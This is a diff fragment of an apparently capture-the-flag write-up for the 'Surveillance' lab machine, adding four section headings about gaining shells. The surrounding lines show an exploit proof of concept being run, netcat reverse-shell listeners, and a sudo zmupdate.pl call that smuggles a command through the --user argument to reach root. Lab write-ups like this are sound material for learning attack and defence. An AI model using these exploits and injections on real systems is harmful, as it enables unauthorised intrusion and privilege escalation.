@@ -44,7 +44,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 #### Exploit
 I found [this](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce)
-
+## Shell into www-data
 ```bash
 ❯ python poc_work.py http://surveillance.htb
 [-] Get temporary folder and document root ...
@@ -159,6 +159,7 @@ Hardware.Mon.#1..: Temp: 53c Util: 21%
 Started: Mon Feb  5 09:46:05 2024
 Stopped: Mon Feb  5 09:46:12 2024
 ```
+## Shell into Matthew
 ```bash
 ❯ ssh matthew@surveillance.htb
 matthew@surveillance.htb''s password: 
@@ -292,6 +293,7 @@ Got Token: key:785251be951a4574928b1e4a49847cf6bb0d976e,1707104533
 [>] Sending payload..
 [!] Script executed by out of time limit (if u used revshell, this will exit the script)
 ```
+## Shell into Zoneminder
 ```bash
 ❯ nc -nvlp 9002
 Connection from 10.10.11.245:38042
@@ -365,6 +367,7 @@ zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/t
     Press 'y' for a backup or 'n' to continue : y
     Creating backup to /tmp/zm/zm-1.dump. This may take several minutes.
 ```
+## Shell into Root
 ```bash
 ❯ nc -nvlp 9005
 Connection from 10.10.11.245:47708
